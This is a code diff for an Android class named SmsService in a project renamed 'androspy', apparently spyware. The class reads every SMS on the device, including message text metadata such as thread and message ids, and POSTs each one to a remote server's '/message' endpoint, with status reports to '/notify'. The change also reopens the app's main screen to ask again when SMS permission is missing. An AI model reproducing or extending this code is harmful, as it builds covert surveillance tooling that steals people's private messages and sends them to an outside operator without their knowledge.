@@ -1,7 +1,8 @@
-package buddy.ap.com.adobot;
+package buddy.ap.com.androspy;
 
 import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -17,19 +18,24 @@ import java.util.HashMap;
 import http.Http;
 import io.socket.client.Socket;
 
+import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
+
 public class SmsService extends Thread implements Runnable {
 
     private static String TAG = "SmsService";
 
     public static final String POSTURL = "/message";
-    Client client;
-    Socket socket;
-    int numsms;
+
+    private CommonParams commonParams;
+    private Client client;
+    private Socket socket;
+    private int numsms;
 
     public SmsService(Client client, int numsms) {
         this.client = client;
         this.socket = client.getSocket();
         this.numsms = numsms;
+        this.commonParams = new CommonParams(client);
     }
 
     @Override
@@ -45,10 +51,10 @@ public class SmsService extends Thread implements Runnable {
 
             HashMap start = new HashMap();
             start.put("event", "getmessages:started");
-            start.put("uid", client.getUid());
-            start.put("device", client.getDevice());
+            start.put("uid", commonParams.getUid());
+            start.put("device", commonParams.getDevice());
             Http req = new Http();
-            req.setUrl(client.SERVER + "/notify");
+            req.setUrl(commonParams.getServer() + "/notify");
             req.setMethod("POST");
             req.setParams(start);
             req.execute();
@@ -74,7 +80,7 @@ public class SmsService extends Thread implements Runnable {
                         String type = mCur.getString(mCur.getColumnIndex("type"));
 
                         HashMap p = new HashMap();
-                        p.put("uid", client.getUid());
+                        p.put("uid", commonParams.getUid());
                         p.put("type", type);
                         p.put("message_id", id);
                         p.put("thread_id", thread_id);
@@ -88,7 +94,7 @@ public class SmsService extends Thread implements Runnable {
 
                         Http smsHttp = new Http();
                         smsHttp.setMethod("POST");
-                        smsHttp.setUrl(client.SERVER + POSTURL);
+                        smsHttp.setUrl(commonParams.getServer() + POSTURL);
                         smsHttp.setParams(p);
                         smsHttp.execute();
 
@@ -104,10 +110,10 @@ public class SmsService extends Thread implements Runnable {
 
                 HashMap done = new HashMap();
                 done.put("event", "getmessages:empty");
-                done.put("uid", client.getUid());
-                done.put("device", client.getDevice());
+                done.put("uid", commonParams.getUid());
+                done.put("device", commonParams.getDevice());
                 Http doneSMS = new Http();
-                doneSMS.setUrl(client.SERVER + "/notify");
+                doneSMS.setUrl(commonParams.getServer() + "/notify");
                 doneSMS.setMethod("POST");
                 doneSMS.setParams(done);
                 doneSMS.execute();
@@ -116,10 +122,10 @@ public class SmsService extends Thread implements Runnable {
 
             HashMap done = new HashMap();
             done.put("event", "getmessages:done");
-            done.put("uid", client.getUid());
-            done.put("device", client.getDevice());
+            done.put("uid", commonParams.getUid());
+            done.put("device", commonParams.getDevice());
             Http doneSMS = new Http();
-            doneSMS.setUrl(client.SERVER + "/notify");
+            doneSMS.setUrl(commonParams.getServer() + "/notify");
             doneSMS.setMethod("POST");
             doneSMS.setParams(done);
             doneSMS.execute();
@@ -129,14 +135,18 @@ public class SmsService extends Thread implements Runnable {
             Log.i(TAG, "No SMS permission!!!");
             HashMap noPermit = new HashMap();
             noPermit.put("event", "nopermission");
-            noPermit.put("uid", client.getUid());
-            noPermit.put("device", client.getDevice());
+            noPermit.put("uid", commonParams.getUid());
+            noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "READ_SMS");
             Http doneSMS = new Http();
-            doneSMS.setUrl(client.SERVER + "/notify");
+            doneSMS.setUrl(commonParams.getServer() + "/notify");
             doneSMS.setMethod("POST");
             doneSMS.setParams(noPermit);
             doneSMS.execute();
+            //ask permissions
+            Intent i = new Intent(client, MainActivity.class);
+            i.addFlags(FLAG_ACTIVITY_NEW_TASK);
+            client.startActivity(i);
         }
     }
 
